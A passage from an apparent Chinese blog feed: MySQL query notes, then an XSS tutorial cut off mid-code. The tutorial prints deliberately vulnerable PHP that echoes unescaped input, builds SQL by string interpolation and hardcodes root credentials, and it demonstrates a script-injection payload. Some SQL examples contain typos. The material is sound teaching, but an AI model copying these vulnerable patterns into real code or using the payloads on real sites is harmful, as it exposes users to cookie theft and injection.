<h4 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询男朋友不在男神表的女神名
SELECT
	b.name,
	bo.*
FROM
	beatuy b
LEFT OUTER JOIN
	boys bo
ON
	b.&#96;boyfriend_id&#96; &#x3D; bo.&#96;id&#96;
WHERE
	bo.&#96;id&#96; IS NULL;</code></pre>

<h4 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#查询哪个部门没有员工
SELECT
	d.*;
	e.employee_id
FROM
	employees e
RIGHT OUTER JOIN
	departments d
ON
	d.&#96;department_id&#96; &#x3D; e.&#96;department_id&#96;
WHERE
	e.&#96;employee_id&#96; IS NULL;</code></pre>

<h4 id="全外连接"><a href="#全外连接" class="headerlink" title="全外连接"></a>全外连接</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#全外连接
SELECT
	b.*,
	bo.*
FROM
	beauty b
FULL OUTER JOIN
	boys bo
ON
	b.&#96;boyfriend_id&#96; &#x3D; bo.id;</code></pre>

<h3 id="交叉连接-cross"><a href="#交叉连接-cross" class="headerlink" title="交叉连接-cross"></a>交叉连接-cross</h3><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	b.*,
	bo.*
FROM
	beauty b
CROSS JOIN
	boys bo;</code></pre>

<h1 id="进阶7-子查询"><a href="#进阶7-子查询" class="headerlink" title="进阶7-子查询"></a>进阶7-子查询</h1><ul>
<li><p>含义：出现在其他语句中的select语句，称为子查询或内查询</p>
<p> 外部的查询语句，称为主查询或外查询</p>
</li>
<li><p>分类：</p>
<ul>
<li><p>按子查询出现的位置</p>
<blockquote>
<p>where或having后面</p>
<p>select后面：只支持标量子查询</p>
<p>from后面：支持表子查询</p>
<p>exists后面（相关子查询）</p>
</blockquote>
</li>
<li><p>按结果集的行列数不同</p>
<blockquote>
<p>标量子查询（结果集只有一行一列）</p>
<p>列子查询（结果集只有一行多列）</p>
<p>行子查询（结果集有一行多列）</p>
<p>表子查询（结果集一般为多行多列）</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="where后面"><a href="#where后面" class="headerlink" title="where后面"></a>where后面</h2><h3 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h3><ul>
<li>查询谁的工资比Abel高</li>
</ul>
<p>1.查询Abel的工资</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	salary
FROM
	employees
WHERE
	last_name &#x3D; &#39;Abel&#39;;</code></pre>

<p>2.查询满足salary&gt;1结果的员工信息</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	*
FROM
	employees
WHERE
	salary &gt; ( 
        SELECT 
        	salary 
        FROM 
        	employees 
        WHERE 
        	last_name &#x3D; &#39;Abel&#39; );</code></pre>

<h3 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h3><h4 id="in-1"><a href="#in-1" class="headerlink" title="in"></a>in</h4><ul>
<li>返回location_id是1400或1700的部门中的所有员工姓名</li>
</ul>
<p>1.查询location_id是1400或1700的部门编号</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">
SELECT DISTINCT
	departmen_id
FROM
	departments
WHERE
	location_id IN (1400,1700)</code></pre>

<p>2.查询部门编号是1中某一个的员工姓名</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	last_name
FROM
	employees
WHERE
	department_id IN (
        SELECT DISTINCT
			departmen_id
		FROM
			departments
		WHERE
			location_id IN (1400,1700));</code></pre>

<h4 id="any-x2F-all"><a href="#any-x2F-all" class="headerlink" title="any&#x2F;all"></a>any&#x2F;all</h4><ul>
<li>查询其他部门中比job_id为’IT_PROG’部门任意一个员工的工资低的员工的员工号、姓名、job_id 以及salary</li>
</ul>
<p>1.查询job_id为’IT_PROG’部门的工资</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT DISTINCT
	salary
FROM
	employees
WHERE
	job_id &#x3D; &#39;IT_PROG&#39;;</code></pre>

<p>2.查询salary&lt;1的员工的员工号、姓名、job_id 以及salary</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	last_name,
	employees_id,
	job_id,
	salary
FROM
	employees
WHERE
	salary &lt; ANY(
    	SELECT DISTINCT
			salary
		FROM
			employees
		WHERE
			job_id &#x3D; &#39;IT_PROG&#39;
)AND
	job_id &lt;&gt; &#39;IT_PROG&#39;;</code></pre>

<h3 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h3><ul>
<li>查询员工编号最小并且工资最高的员工信息</li>
</ul>
<p>1.查询最小的员工编号</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	MIN(employee_id)
FROM
	employees;</code></pre>

<p>2.查询最高工资</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	MAX(salary)
FROM
	employees;</code></pre>

<p>3.查询员工信息</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	*
FROM
	employees
WHERE
	(employees_id,salary) &#x3D; (
    	SELECT
			MIN(employee_id),
        	MAX(salary)
		FROM
			employees
);</code></pre>

<h2 id="select后面"><a href="#select后面" class="headerlink" title="select后面"></a>select后面</h2><ul>
<li>查询每个部门的员工个数</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	d.*,(
    SELECT
    	COUNT(*)
    FROM 
        employees e
    WHERE
        e.department_id &#x3D; d.&#96;department_id&#96;
	)
FROM
	department d;</code></pre>

<ul>
<li>查询员工号&#x3D;102的部门名</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	(
    SELECT
    	department_name
    FROM
    	departments d
    INNER JOIN
    	employees e
    ON
    	d.department_id &#x3D; e.department_id
    WHERE
    	e.employees_id &#x3D; 102)</code></pre>

<h2 id="from后面"><a href="#from后面" class="headerlink" title="from后面"></a>from后面</h2><ul>
<li>查询每个部门平均工资的工资等级</li>
</ul>
<p>1.查询每个部门的平均工资</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	AVG(salary),department_id
FROM
	employees
GROUP BY
	department_id</code></pre>

<p>2.连接1的结果集和job_grades表，筛选条件平均工资 between lowest_sal and highest_sal</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	ag_dep.*,g.&#96;grade_level&#96;
FROM (
	SELECT
		AVG(salary) ag,department_id
    FROM
    	employees
    GROUP BY
    	department_id
    )ag_dep
INNER JOIN 
	job_grades g
ON
	ag_dep.ag
BETWEEN	lowest_sal AND highest_sal;</code></pre>

<h2 id="exists后面（相关子查询）"><a href="#exists后面（相关子查询）" class="headerlink" title="exists后面（相关子查询）"></a>exists后面（相关子查询）</h2><ul>
<li>查询有员工的部门名</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	department_name
FROM
	departments
WHERE EXISTS (
	SELECT
		*
	FROM
		employees e
	WHERE
    	d.&#96;department_id&#96; &#x3D; e.&#96;department_id&#96;
);</code></pre>

<h1 id="进阶8-分页查询-limit"><a href="#进阶8-分页查询-limit" class="headerlink" title="进阶8-分页查询-limit"></a>进阶8-分页查询-limit</h1><ul>
<li>语法</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT
	查询列表
FROM
	表
【...
】
limit
	offset,size;
#offset：要显示的条目的起始索引（从0开始）(从0开始时可以省略)
#size：要显示的条目个数</code></pre>

<ul>
<li>查询前五条员工信息</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM employees limit 0,5;
#SELECT * FROM employees limit 5;</code></pre>

<ul>
<li>查询11-25条信息</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM employees limit 11,15;</code></pre>

<h1 id="进阶9-联合查询-union"><a href="#进阶9-联合查询-union" class="headerlink" title="进阶9-联合查询-union"></a>进阶9-联合查询-union</h1><ul>
<li><p>含义：将多条查询语句的查询结果合并</p>
</li>
<li><p>语法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查询语句1
UNION
查询语句2
UNION
...</code></pre>
</li>
<li><p>应用场景：要查询的结果来自多个表，且表之间没有连接关系，但查询信息一致时</p>
</li>
<li><p>特点</p>
</li>
</ul>
<ol>
<li>要求多条查询语句的查询列数是一致的</li>
<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>
<li>union关键字默认去重，如果不需要去重使用union all</li>
</ol>
<ul>
<li>查询中国用户中年男性的信息以及外国用户中年男性的用户信息</li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT id,cname FROM t_ca WHERE csex&#x3D;&#39;男&#39;
UNION
SELECT t_id,tname FROM t_ua WHERE tGender&#x3D;&#39;male&#39;;</code></pre>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://pan.baidu.com/s/1bsz3vGItmBfecI8fuxnLIA">本博客使用的数据库（提取码k6kq）</a></p>
<p><a href="https://www.bilibili.com/video/BV12b411K7Zu">课程学习</a></p>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2022/02/28/xss/</url>
    <content><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XSS(Cross Site Scripting)，跨站脚本攻击。攻击者通过网站注入点注入客户端可执行解析的payload，当用户访问网页时，恶意payload自动加载并执行，以达到攻击者目的（窃取Cookie、恶意传播、钓鱼欺骗等）。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><img src="/2022/02/28/xss/1.png" class="" loading="lazy">

<ol>
<li>获取用户信息：浏览器信息、IP地址、Cookie等；</li>
<li>钓鱼：构造与原网站相似的网站，骗取账号密码；</li>
<li>注入密码或广告链接：在主站注入非法网站的链接；</li>
<li>后台增删改查数据：配合CSRF，骗取用户点击，利用JS模拟浏览器发包；</li>
<li>XSS蠕虫：进入网站自动进行某些操作，例如关注博主或者自动回复。</li>
</ol>
<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>主要分为三种：</p>
<ul>
<li><p>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
</li>
<li><p>储存型XSS：持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</p>
</li>
<li><p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
</li>
</ul>
<h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>仅执行一次，非持久型；</li>
<li>参数型跨站脚本。</li>
</ul>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><img src="/2022/02/28/xss/2.png" class="" loading="lazy">

<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><ul>
<li>前端页面：</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>反射型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss1.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    Please input your name:
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<ul>
<li>后端页面：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome *'</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>前端是一个提交框，提交数据到后端</p>
<img src="/2022/02/28/xss/image-20220328210803491.png" class="" loading="lazy">

<p>后端会把输入的数据展示出来</p>
<img src="/2022/02/28/xss/image-20220328211206629.png" class="" loading="lazy">

<p>注入JS：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，进入页面会执行</p>
<img src="/2022/02/28/xss/image-20220328211518050.png" class="" loading="lazy">

<p>在源码中可以看到已经成功注入</p>
<img src="/2022/02/28/xss/image-20220328211555947.png" class="" loading="lazy">

<p>这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： 前端–&gt;后端–&gt;前端。</p>
<h1 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h1><h2 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h2><ul>
<li>持久型；</li>
<li>恶意脚本直接储存到数据库中。</li>
</ul>
<h2 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h2><img src="/2022/02/28/xss/3.png" class="" title="img" loading="lazy">

<h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><ul>
<li>前端页面</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>储存型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss2.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>昵称：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>留言：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>添加留言<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">return</span> <span class="token function">validate_form</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>delete<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>清除留言<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">return</span> <span class="token function">firm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">function</span> <span class="token function">validate_required</span><span class="token punctuation">(</span><span class="token parameter">field<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">with</span> <span class="token punctuation">(</span>field<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> value <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">function</span> <span class="token function">validate_form</span><span class="token punctuation">(</span><span class="token parameter">form</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">with</span> <span class="token punctuation">(</span>form<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">validate_required</span><span class="token punctuation">(</span>nickName<span class="token punctuation">,</span> <span class="token string">"昵称不能为空！"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        nickName<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">validate_required</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token string">"消息内容不能为空！"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        message<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">function</span> <span class="token function">firm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"确定清除所有留言吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<ul>
<li>后端页面</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> @<span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xss'</span><span class="token punctuation">,</span> <span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"delete"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"TRUNCATE xss"</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('清除成功！')&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO xss ( username, message) VALUES ('<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$message</span></span>');"</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
